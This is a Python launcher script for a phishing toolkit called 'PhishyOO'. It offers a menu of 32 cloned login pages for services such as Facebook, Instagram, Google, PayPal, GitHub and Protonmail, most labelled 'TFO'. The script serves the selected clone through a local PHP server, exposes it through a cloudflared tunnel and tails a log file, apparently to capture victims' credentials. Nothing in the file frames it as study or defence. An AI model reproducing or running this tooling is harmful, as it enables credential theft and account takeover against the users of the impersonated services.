import os
import subprocess
import signal
import time
import src.processkiller as kill
import src.cloudflared as cf

def php_killer():
    kill.killer()

def intro():
    print('''
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗   ██╗ ██████╗ ██╗   ██╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║╚██╗ ██╔╝██╔═══██╗██║   ██║
██████╔╝███████║██║███████╗███████║ ╚████╔╝ ██║   ██║██║   ██║
██╔═══╝ ██╔══██║██║╚════██║██╔══██║  ╚██╔╝  ██║   ██║██║   ██║
██║     ██║  ██║██║███████║██║  ██║   ██║   ╚██████╔╝╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝
                                              Tool By AdMin❤️''')
    
     
    
def loading():
    intro()
    print("Loading...", end='', flush=True)
    for _ in range(10):
        print(".", end='', flush=True)
        time.sleep(0.1)  
    print("\n") 


def ctrlc(exit_function):
    def handler(signum, frame):
        os.system("clear")
        intro()
        time.sleep(2)
        os.chdir("../../")
        exit_function()
    signal.signal(signal.SIGINT, handler)

def run_server(folder_name):
    ctrlc(main)
    os.chdir(f"sites/{folder_name}")
    os.system("clear")
    subprocess.Popen(["php", "-S", "127.0.0.1:8000"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    subprocess.Popen(["tail", "-f", "log.txt"]).communicate()

def shut():
    print("[+] Shuting down servers")
    time.sleep(2)
    php_killer()
    os.system("clear")
    print("Bye <3")
    exit()

def site_options():
    print('''
[+] Select Your Option:

[01] Tiktok                [12] Linkedin-TFO      [23] Wordpress     
[02] Facebook-TFO          [13] Hotstar-TFO       [24] Snapchat-TFO                      
[03] Instagram-TFO         [14] Spotify-TFO       [25] Protonmail-TFO 
[04] Uber Eats-TFO         [15] Github-TFO        [26] Stackoverflow                  
[05] OLA-TFO               [16] IPFinder          [27] ebay-TFO  
[06] Google-TFO            [17] Zomato-TFO        [28] Twitch-TFO
[07] Paytm-TFO             [18] PhonePay-TFO      [29] Ajio-TFO
[08] Netflix-TFO           [19] Paypal-TFO        [30] Cryptocurrency 
[09] Instagram-Followers   [20] Telegram-TFO      [31] Mobikwik-TFO
[10] Amazon-TFO            [21] Twitter-TFO       [32] Pinterest
[11] WhatsApp-TFO          [22] Flipcart-TFO     [99] Exit

''')
    
folder_names = {
        '1': 'tiktok',
        '2': 'facebook',
        '3': 'instagram',
        '4': 'uber',
        '5': 'ola',
        '6': 'google',
        '7': 'paytm',
        '8': 'netflix',
        '9': 'instafollow',
        '10': 'amazon',
        '11': 'whatsapp',
        '12': 'linkedin',
        '13': 'hotstar',
        '14': 'spotify',
        '15': 'github',
        '16': 'ipfinder',
        '17': 'zomato',
        '18': 'phonepay',
        '19': 'paypal',
        '20': 'telegram',
        '21': 'twitter',
        '22': 'flipcart',
        '23': 'wordpress',
        '24': 'snapchat',
        '25': 'protonmail',
        '26': 'stackoverflow',
        '27': 'ebay',
        '28': 'twitch',
        '29': 'ajio',
        '30': 'cryptocurrency',
        '31': 'mobikwik',
        '32': 'pinterest'
    }
def run(folder_name):
    if folder_name:
        run_server(folder_name)
    else:
        php_killer()

def main():
    ctrlc(shut)
    php_killer()
    os.system("clear")
    intro()
    site_options()
    choice = input("Enter your choice (eg: 1): ")
    os.system("clear")

    if choice == '99':
        shut()

    folder_name = folder_names.get(choice)
    cf.run_command_in_new_terminal(cf.command)
    run(folder_name)

os.system("clear")
loading()

main()
